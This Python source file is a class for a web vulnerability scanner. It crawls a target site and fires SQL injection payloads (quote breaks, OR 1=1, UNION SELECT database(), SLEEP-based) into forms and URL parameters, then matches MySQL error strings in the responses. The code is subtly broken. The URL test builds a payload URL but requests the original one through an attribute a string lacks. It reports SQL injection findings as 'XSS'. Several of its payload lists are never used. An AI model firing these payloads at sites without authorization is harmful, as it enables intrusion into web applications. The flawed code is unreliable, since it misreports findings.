from vulnerability.crawl import Crawl


class SQL(Crawl):

    def __init__(self, target_url, ignore_links):
        super().__init__(target_url, ignore_links)  # Pass arguments to Crawl

        self.error_payloads = ["'", "\"", "' OR '1'='1 -- ", "' OR '1'='1#"]
        self.union_payloads = ["' UNION SELECT NULL, NULL, database() -- "]
        self.boolean_payloads = ["' AND 1=1 -- ", "' AND 1=0 -- "]
        self.time_payloads = ["' AND SLEEP(5) -- "]
        self.mysql_errors = [
            "SQL syntax", "Warning: mysql_", "You have an error in your SQL syntax;", "MySQL server version",
            "check the manual that corresponds to your MySQL server", "Unknown column", "MySQL fetch error"
        ]

    def run_program(self):
        for link in self.target_link:
            forms = self.extract_fourms(link)
            for form in forms:
                print("[+] Testing form in " + link)
                sql_error_payload = self.test_sql_error_form(link,form)

                if sql_error_payload:
                    print("\n\n[***] Error based SQL injection discovered in " + link + " in the following form")
                    print(form)
                    print("\n payload = " + sql_error_payload)

                if "=" in link:
                    print("\n\n[+] Testing " + link)
                    sql_error_payload = self.test_sql_error_url(link)
                    if sql_error_payload:
                        print("\n\n[***] XSS discovered in " + link)
                        print("\n payload = " + sql_error_payload)

    def test_sql_error_form(self,url,form):
        for payload in self.error_payloads:
            response = self.submit_form(form,payload,url)
            for error in self.mysql_errors:
                if error in response.content.decode(errors="ignore"):
                    return payload
        return None

    def test_sql_error_url(self,url):
        for payload in self.error_payloads:
            test_url = url.replace("=","="+payload)
            response = url.session.get(url)

            for error in self.mysql_errors:
                if error in response.content.decode(errors="ignore"):
                    return payload
        return None